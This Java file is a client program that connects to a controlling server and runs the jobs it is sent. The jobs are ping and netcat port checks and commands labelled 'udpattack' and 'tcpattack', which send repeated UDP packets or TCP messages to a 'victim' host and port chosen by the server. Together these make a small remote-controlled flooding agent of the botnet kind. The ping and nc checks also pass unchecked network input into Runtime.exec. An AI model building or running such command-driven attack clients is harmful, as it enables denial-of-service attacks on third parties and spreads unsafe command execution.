import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;
import java.util.concurrent.TimeUnit;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
/*
This class defines the client
 */
public class JobSeeker {

public static void main(String args[]) throws Exception {

    InetAddress address=InetAddress.getLocalHost();
    Socket s1=null;
    String line=null;
    BufferedReader br=null;
    BufferedReader is=null;
    PrintWriter os=null;
    //searches for client using address and port 4445 and establishes a conection when available
    try {
        s1=new Socket(address, 4445); // You can use static final constant PORT_NUM
        br= new BufferedReader(new InputStreamReader(System.in));
        is=new BufferedReader(new InputStreamReader(s1.getInputStream()));
        os= new PrintWriter(s1.getOutputStream());
    }
    catch (IOException e){
        e.printStackTrace();
        System.err.print("IO Exception");
    }

    System.out.println("Client Address : "+address);
    System.out.println("Enter Data to echo Server ( Enter QUIT to end):");
    String response=null;
    //gets a job from the server and does it. On completion, it sends back a string, confirming the completion of the job.
    try{
        while(true)
        {
            response=is.readLine();
			System.out.println("Job received: "+ response);
			if(response.equals("done5")){
				TimeUnit.SECONDS.sleep(5);
				os.println("5 seconds have passed ~ DONE!");
				os.flush();
			}
			else if(response.equals("done10")){
				TimeUnit.SECONDS.sleep(10);
				os.println("10 seconds have passed ~ DONE!");
				os.flush();
			}
      else if(response.equals("justip"))//option to check if given ip address is online
      {
        String ipA=is.readLine();
        System.out.println("Checking if "+ipA+" is online...");
        //Runtime.getRuntime().exec("ping " + ipA);
        Runtime rt = Runtime.getRuntime();
        Process proc = rt.exec("ping "+ipA);
        BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
        System.out.println("Here is the output of the command:\n");
        String s = null;
        String op3="";
        while ((s = stdInput.readLine()) != null)
        {
          System.out.println(s);
          op3=op3+s+"\n";
        }
        os.println(op3);
        os.flush();
        os.println("justip ~ DONE!");
        os.flush();
      }
      else if(response.equals("portip"))//option to check if given IP's port's status
      {
        String ipA=is.readLine();
        int portn=Integer.parseInt(is.readLine());
        System.out.println("Checking status of port "+portn+" of "+ipA+" is online...");
      //  telnet <ip_address> <port_number>
        Runtime rt = Runtime.getRuntime();
        Process proc = rt.exec("nc -zv "+ipA+" "+portn);
        BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
        System.out.println("Here is the output of the command:\n");
        String s = null;
        String op3="";
        while ((s = stdInput.readLine()) != null)
        {
          System.out.println(s);
          op3=op3+s+"\n";
        }
        os.println(op3);
        os.flush();
        os.println("portip ~ DONE!");
        os.flush();
      }
      else if(response.equals("udpattack"))//option to initiate UDP attack by pinging given IP address
      {
        System.out.println("Initiating UDP attack...");
        String ipA=is.readLine();
        int portn=Integer.parseInt(is.readLine());
        InetAddress ip = InetAddress.getByName(ipA);
        DatagramSocket ds = new DatagramSocket();
        byte buf[] = "UDP Attack!".getBytes();
        DatagramPacket DpSend =  new DatagramPacket(buf, buf.length, ip, portn);
        for(int qk=0;qk<60;qk++)//sends 60 messages in a duration of 60 seconds
        {

           ds.send(DpSend);
          Thread.sleep(1000);
        }
        os.println("udpattack ~ DONE!");
        os.flush();
      }
      else if(response.equals("tcpattack"))//option to initiate TCP attack by making a socket with given IP address and port and opening an output stream to it, and flooding it with messages
      {
        String ipA=is.readLine();
        int portn=Integer.parseInt(is.readLine());
        try{
          Socket sock=new Socket(ipA, portn); //establishes connection
          PrintWriter inpst=new PrintWriter(sock.getOutputStream());//gets inputstream to flood with messages
          System.out.println("TCP connection with victim established...");
          for(int qk=0;qk<60;qk++)//sends 60 messages in a duration of 60 seconds
          {
            inpst.println("attacking...");
            inpst.flush();
            Thread.sleep(1000);
          }

        }
        catch(Exception ex){
          System.out.println("Unable to Establish connection...");
        }
        os.println("tcpattack ~ DONE!");
        os.flush();
      }
			else{
				System.out.println("No message received");
			}
        }
      }
    catch(IOException e)
    {
        e.printStackTrace();
        System.out.println("Socket read Error");
    }
    finally
    {
        is.close();os.close();br.close();s1.close();
        System.out.println("Connection Closed");
    }
}
}
